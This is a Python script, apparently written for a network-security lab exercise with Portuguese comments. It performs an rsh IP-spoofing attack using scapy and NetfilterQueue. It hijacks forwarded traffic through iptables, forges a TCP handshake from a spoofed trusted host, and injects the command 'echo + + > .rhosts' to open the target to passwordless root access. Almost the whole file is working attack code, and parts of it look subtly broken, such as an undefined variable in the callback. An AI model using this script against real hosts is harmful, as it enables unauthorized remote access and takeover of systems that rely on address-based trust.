import os
import logging as log
from scapy.all import IP, TCP, send, sniff, Raw
from netfilterqueue import NetfilterQueue
import socket

class RshSnoof:
    def __init__(self, hostDict, queueNum):
        self.hostDict = hostDict
        self.queueNum = queueNum
        self.queue = NetfilterQueue()

    def __call__(self):
        log.info("Interceptando pacotes rsh... (14)")
        # Adiciona regra do iptables para redirecionar pacotes TCP da porta 514 (rsh) para a fila NFQUEUE
        os.system(f'iptables -I FORWARD -p tcp -j NFQUEUE --queue-num {self.queueNum}')
        self.queue.bind(self.queueNum, self.callBack)
        try:
            self.queue.run()
        finally:
            os.system(f'iptables -D FORWARD -p tcp -j NFQUEUE --queue-num {self.queueNum}')
            log.info("[!] Regras do iptables removidas (22)")

    def callBack(self, packet):
        scapyPacket = IP(packet.get_payload()) 
        print(f'callback on {scapyPacket.summary()} and {int(scapyPacket[TCP].flags)}')

        # Aceita o pacote na fila
        packet.accept()

        if scapyPacket.haslayer(TCP) and scapyPacket[TCP].sport == 514:
            if scapyPacket[TCP].flags == 18:  # SYN-ACK
                log.info(f'[RSH SYN/ACK] {scapyPacket.summary()} (62)')
                response_packet = IP(src=scapyPacket[IP].dst, dst=scapyPacket[IP].src) / \
                                    TCP(sport=scapyPacket[TCP].dport, dport=scapyPacket[TCP].sport,
                                        flags="A", seq=scapyPacket[TCP].ack, ack=scapyPacket[TCP].seq +1, window=scapyPacket[TCP].window)
                log.info(f'Enviando pacote... (57)')
                send(response_packet, verbose=0)
                log.info(f'[Resposta ACK RSH] {response_packet.summary()} (59)')

                # Cria pacote com comando RSH
                rsh_payload = f"9090\x00root\x00root\x00{command}\x00"
                rsh_packet = IP(src=scapyPacket[IP].dst, dst=scapyPacket[IP].src) / \
                             TCP(sport=scapyPacket[TCP].dport, dport=scapyPacket[TCP].sport,
                                 flags='PA', seq=scapyPacket[TCP].ack, ack=scapyPacket[TCP].seq+1, window=scapyPacket[TCP].window) / \
                             Raw(load=rsh_payload)
                log.info(f'Enviando pacote... (97)')
                send(rsh_packet, verbose=0)
                log.info(f'Pacote RSH com comando enviado: {rsh_packet.summary()} (99)')

        if scapyPacket.haslayer(TCP) and scapyPacket[TCP].dport == 9090:
            if scapyPacket[TCP].flags == 2:  # SYN
                log.info(f'[RSH SECOND SYN] {scapyPacket.summary()} (53)')
                response_packet = IP(src=scapyPacket[IP].dst, dst=scapyPacket[IP].src) / \
                                    TCP(sport=scapyPacket[TCP].dport, dport=scapyPacket[TCP].sport,
                                        flags="SA", seq=12345, ack=scapyPacket[TCP].seq + 1)
                log.info(f'Enviando pacote... (57)')
                send(response_packet, verbose=0)
                log.info(f'[Resposta SYN/ACK RSH] {response_packet.summary()} (59)')

    def start_rsh_connection(self, src_ip, dst_ip, command):
        """
        Inicia uma conexão rsh com spoofing de IP.
        """
        try:
            log.info(f'Iniciando conexão rsh de {src_ip} para {dst_ip}... (84)')
            
            # Cria pacote SYN para iniciar a conexão
            syn_packet = IP(src=src_ip, dst=dst_ip) / TCP(sport=1023, dport=514, flags='S', seq=1000)
            log.info(f'Enviando pacote... (88)')
            send(syn_packet, verbose=0)
            log.info(f'Pacote SYN enviado: {syn_packet.summary()} (90)')

        except Exception as e:
            log.error(f'Erro ao conectar ao host {dst_ip} como {src_ip}: {e} (102)')

if __name__ == '__main__':
    try:
        # Definindo IPs
        src_ip = "10.9.0.6"  # IP falsificado de origem
        dst_ip = "10.9.0.5"  # IP de destino do servidor rsh
        command = "echo + + > .rhosts" 

        # Dicionário de hosts para redirecionamento
        hostDict = {
            b"trusted-server-10.9.0.6": "10.9.0.1",
        }
        queueNum = 1
        log.basicConfig(format='%(asctime)s - %(message)s', level=log.INFO)
        snoof = RshSnoof(hostDict, queueNum)
        
        # Inicia a captura de pacotes em um thread separado
        import threading
        thread = threading.Thread(target=snoof)
        thread.start()

        # Inicia a conexão rsh com spoofing
        snoof.start_rsh_connection(src_ip, dst_ip, command)

    except OSError as error:
        log.error(error)
